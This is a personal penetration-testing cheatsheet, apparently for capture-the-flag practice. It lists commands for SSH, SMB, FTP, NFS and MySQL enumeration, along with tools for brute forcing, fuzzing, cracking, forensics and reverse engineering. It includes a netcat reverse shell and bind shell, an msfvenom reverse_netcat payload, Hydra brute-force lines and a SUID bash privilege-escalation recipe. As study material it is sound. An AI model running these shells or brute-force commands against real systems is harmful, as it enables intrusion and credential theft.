# Cheatsheet

### Common 

* https://www.exploit-db.com/exploits/20745
* words `sudo apt install seclists`




### Commands 
* help  [-h / -help / --help] or man
* ```systemctl stop myservice```
* SSH with key `ssh -i <key-file> <username>@<ip>`
* SSH with Password `ssh username@IP`
* list all permissions `ls -la fielname`
* Copy file `cp /temp/test /temp/folder/`
* Copy Directory `cp -r  /temp/test /temp/folder/`
* move file `mv /temp/test /temp/test2 `
* copy fileusing SSH `scp file.txt remote_username@10.10.0.2:/remote/directory`
* copy directory using SSH `scp -r /root/directory remote_username@10.10.0.2:/remote/directory`
* text `nano`, `vim`, `vi`
* `export PATH=/tmp:$PATH`
* `echo $PATH`



## Useful location  
  ### .ssh Key 
   * Private key ssh ```/home/user-name/.ssh```
   * This file is the private key ```id_rsa```
   * change the file permission ``` chmod 600 ```
   * `ssh -i <key-file> <username>@<ip> `
  ### Wordlists 
   * /usr/share/wordlists/SecLists/Usernames
   *  if not found install it `sudo apt install seclists`
   *  /usr/share/wordlists/rockyou.txt 
 ### Password 
  * listing users `/etc/passwd`
  * listing passowrd `/etc/shadow` 
  
### Nmap
* ` nmap -sU --top-ports 20 10.1.1.1` 

# Fast Tool 
## Netcat
* nc 192.168.1.1 8080
* nc -lvp [listening port], `nc -lvp 4444`

## Hydra 
* install `apt install hydra` 
* used to brute force Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB
* hydra -t 4 -l username -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
* web `hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

## Metasploit 
* https://github.com/security-cheatsheet/metasploit-cheat-sheet
* Run `msfconsole`
* Multi/Handler is a superb tool for catching reverse shells ` use multi/handler`
* `sessions 1 ` 

## Webserver 
### Python code 
* run web server `python3 -m http.server`
* run web server `python3 -m http.server 8090`
* using this to download `wget http://127.0.0.1:8000/file`


# Services  

## SMB
### Enumerating SMB
* enum4linux [options] ip
* use option  ```-a``` all of the above (full basic enumeration)

### SMB Exploit 445, 139
* smbclient //[IP]/[SHARE]
* smbclient //10.10.10.2/sharefilename -U username -p 445

## Telnet 23
### Enumerating Telnet
* nmap
### Exploiting
* telnet [ip] [port]

## FTP 21
### channels 
* a command (sometimes called the control) channel
* a data channel.
### Enumerating FTP
* nmap
### Exploiting
* "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.

## NFS 
### NFS Tools
* `sudo apt install nfs-common`
* by defualt mount,showmount, nfsstat, gssd, idmapd, lockd, statd,
### Enumeration
* nmap
* show all shares `/usr/sbin/showmount -e [IP] `
### Exploiting
* create folder `mkdir /tmp/mount`
* mount folder `sudo mount -t nfs IP:share /tmp/mount/ -nolock`

## SMTP 25
### Enumeration
* nmap
* msfconsole
* auxiliary/scanner/smtp/smtp_enum
### Exploiting
* ` hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ssh` 

## MYSQL 3306
### Install 
* ` sudo apt install default-mysql-client`
### Enumeration
* nmap
### Exploiting
* ` mysql -h [IP] -u [username] -p` 

# Shells 
*  Reverse Shell Generator https://www.revshells.com/
*  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
*
## Reverse shell 
* Target `nc <LOCAL-IP> <PORT> -e /bin/bash`
* Host ` sudo nc -lvnp 443` 

## Bind shell 
* Target `nc -lvnp <port> -e "cmd.exe" `
* Host `nc MACHINE_IP <port> ` 


## Simple Shell msfvenom 

* using telnet 
```
"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

```
* copy and paste the value on telnet session 

### Privilege Escalatation 
### Instalaltion 
* Download bash shell wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash 
## SUID
* SUID: the file or files can be run with the permissions of the file(s) owner/group.
* change bash file to suid bit `chmod +s filename`
* change to excute `chmod +x filename`
* change ower to root `chown root fielname`
* validate (sr-x) permssion `ls -la fielname`
* move the file to target (SSH/ NFS/ FTP )
* run the file with `./fielname -p` on target 
# other Important 
## Start a tcpdump listener



Brute Forcing:
 
•	hydra:
Syntax: hydra -l <username> -P <password_list> <target_service>
Example: hydra -l admin -P password.txt ftp://example.com
Use Case: Perform brute force attacks to crack passwords for various services.
 
•	medusa:
Syntax: medusa -u <username> -P <password_list> -h <target_host> -M <target_service>
Example: medusa -u admin -P password.txt -h example.com -M ftp
Use Case: Conduct brute force attacks against various protocols and services.
 
•	patator:
Syntax: patator <module> <options>
Example: patator ftp_login host=example.com user=FILE0 password=FILE1 0=passwords.txt 1=usernames.txt
Use Case: Perform brute force attacks using a variety of modules and protocols.
 
URL Discovery:
 
•	dirb:
Syntax: dirb <URL> <wordlist>
Example: dirb http://example.com/ common.txt
Use Case: Discover hidden files and directories on a web server.
 
•	gobuster:
Syntax: gobuster <mode> -u <URL> -w <wordlist>
Example: gobuster dir -u http://example.com/ -w common.txt
Use Case: Enumerate files and directories on web servers.
 
•	ffuf:
Syntax: ffuf -w <wordlist> -u <URL> -X <method>
Example: ffuf -w common.txt -u http://example.com/FUZZ -X GET
Use Case: Perform web content discovery and directory/file enumeration.
 
•	wfuzz:
Syntax: wfuzz -w <wordlist> -u <URL>
Example: wfuzz -w common.txt -u http://example.com/FUZZ
Use Case: Discover hidden content and perform URL fuzzing.
 
•	snallygaster:
Syntax: snallygaster <target>
Example: snallygaster http://example.com
Use Case: Discover hidden files and directories from public AWS S3 buckets.
 
 
Vulnerability Scanning:
 
•	OpenVAS:
Syntax: Launch OpenVAS GUI or use openvas command-line tool.
Use Case: Conduct comprehensive vulnerability scanning and assessment of target systems.
 
•	Nessus:
Syntax: Launch Nessus GUI or use nessus command-line tool.
Use Case: Perform vulnerability scanning and vulnerability management.
 
•	Nikto:
Syntax: nikto -h <host>
Example: nikto -h example.com
Use Case: Scan a web server for vulnerabilities and misconfigurations.
 
•	NMAP NSE Scripts:
Syntax: nmap --script=<script> <target>   or   nmap -sV --script vuln <target>
Example: nmap --script=http-vuln-cve2017-5638 192.168.1.1
Use Case: Utilize NSE scripts in NMAP to detect specific vulnerabilities in target systems.
 
•	OWASP ZAP:
Syntax: Launch OWASP ZAP GUI or use zap-cli command-line tool.
Use Case: Perform web application vulnerability scanning and penetration testing.
 
 
 
Reconnaissance:
 
•	whois:
Syntax: whois <domain>
Example: whois example.com
Use Case: Obtain domain registration information for target enumeration.
 
•	nmap:
Syntax: nmap <target>
Example: nmap 192.168.1.1
Use Case: Scan for open ports and services on a target system.
 
•	recon-ng:
Syntax: recon-ng
Example: recon-ng
Use Case: Perform automated reconnaissance tasks and gather information.
 
•	theHarvester:
Syntax: theharvester -d <domain> -l <limit>
Example: theharvester -d example.com -l 100
Use Case: Harvest emails, subdomains, and hosts related to a domain.
 
•	censys:
Syntax: censys <query>
Example: censys 80.http.get.headers.server: "Apache"
Use Case: Collect information about hosts, domains, and certificates.
 
•	shodan:
Syntax: shodan search <query>
Example: shodan search port:80 http.title:"Welcome to nginx"
Use Case: Search for internet-connected devices and services.
 
 
Web Application Testing:
 
•	burp:
Syntax: Launch Burp Suite GUI.
Use Case: Intercept and modify web traffic for security testing.
 
•	sqlmap:
Syntax: sqlmap -u <URL>
Example: sqlmap -u http://example.com/page.php?id=1
Use Case: Detect and exploit SQL injection vulnerabilities.
 
•	xsser:
Syntax: xsser -u <URL>
Example: xsser -u http://example.com/page.php?search=test
Use Case: Identify and exploit Cross-Site Scripting (XSS) vulnerabilities.
 
•	nikto:
Syntax: nikto -h <host>
Example: nikto -h example.com
Use Case: Scan a web server for vulnerabilities and misconfigurations.
 
•	dirb:
Syntax: dirb <URL> <wordlist>
Example: dirb http://example.com/ common.txt
Use Case: Discover hidden files and directories on a web server.
 
Cryptography:
 
•	cyberchef:
Syntax: Access the CyberChef web interface.
Use Case: Perform various cryptographic operations, encoding, and decoding.
 
•	hashcat:
Syntax: hashcat -m <hash_mode> <hash_file> <wordlist>
Example: hashcat -m 0 hashes.txt rockyou.txt
Use Case: Crack password hashes using different attack modes.
 
•	john:
Syntax: john <hash_file>
Example: john hashes.txt
Use Case: Perform offline password cracking on hashed passwords.
 
•	steghide:
Syntax: steghide extract -sf <file> -p <password>
Example: steghide extract -sf image.jpg -p mypassword
Use Case: Extract hidden data from image and audio files.
 
•	rsatool:
Syntax: rsatool -f PEM -o key.pem
Example: rsatool -f PEM -o private_key.pem
Use Case: Generate RSA key pairs and perform RSA operations.
 
Forensics:
 
•	autopsy:
Syntax: Launch Autopsy GUI.
Use Case: Conduct GUI-based digital forensics analysis and investigation.
 
•	volatility:
Syntax: volatility -f <image_file> <profile> <command>
Example: volatility -f memory.dmp imageinfo
Use Case: Analyze memory dumps and extract forensic artifacts.
 
•	wireshark:
Syntax: Launch Wireshark GUI.
Use Case: Capture and analyze network traffic for protocol analysis.
 
•	binwalk:
Syntax: binwalk <file>
Example: binwalk firmware.bin
Use Case: Extract embedded files and code from binary files.
 
•	foremost:
Syntax: foremost -i <image_file>
Example: foremost -i disk.img
Use Case: Perform file carving and recover deleted files from disk images.
 
Steganography:
 
•	steghide:
Syntax: steghide extract -sf <file> -p <password>
Example: steghide extract -sf image.jpg -p mypassword
Use Case: Extract hidden data from image and audio files.
 
•	stegsolve:
Syntax: java -jar stegsolve.jar
Example: java -jar stegsolve.jar
Use Case: Analyze and extract hidden information from images.
 
•	zsteg:
Syntax: zsteg <image>
Example: zsteg image.png
Use Case: Detect and extract hidden data from PNG and BMP images.
 
•	outguess:
Syntax: outguess -r <file> <output_file>
Example: outguess -r image.jpg output.txt
Use Case: Embed and extract data using various steganographic techniques.
 
•	stegano:
Syntax: stegano <command> <args>
Example: stegano reveal -i image.jpg -s secret.txt
Use Case: Perform steganography operations on images.
 
Reverse Engineering:
 
•	ida:
Syntax: Launch IDA Pro GUI.
Use Case: Analyze and disassemble binary files for reverse engineering.
 
•	ghidra:
Syntax: ghidraRun <project>
Example: ghidraRun my_project
Use Case: Perform software reverse engineering using a powerful framework.
 
•	radare2:
Syntax: r2 <binary>
Example: r2 binary
Use Case: Disassemble and analyze binaries using a command-line interface.
 
•	ollydbg:
Syntax: Launch OllyDbg GUI.
Use Case: Debug and analyze executable files for reverse engineering.
 
•	gdb:
Syntax: gdb <binary>
Example: gdb binary
Use Case: Debug and analyze executable files using the GNU Debugger.
 
Exploitation:
 
•	metasploit:
Syntax: Launch Metasploit Framework Console.
Example: msfconsole
Use Case: Exploit vulnerabilities and launch attacks using a wide range of modules.
 
•	searchsploit:
Syntax: searchsploit <search_term>
Example: searchsploit apache 2.4.7
Use Case: Search for public exploits and vulnerabilities.
 
•	nc:
Syntax: nc <target> <port>
Example: nc 192.168.1.1 8080
Use Case: Establish network connections for various purposes, such as banner grabbing or reverse shells.
 


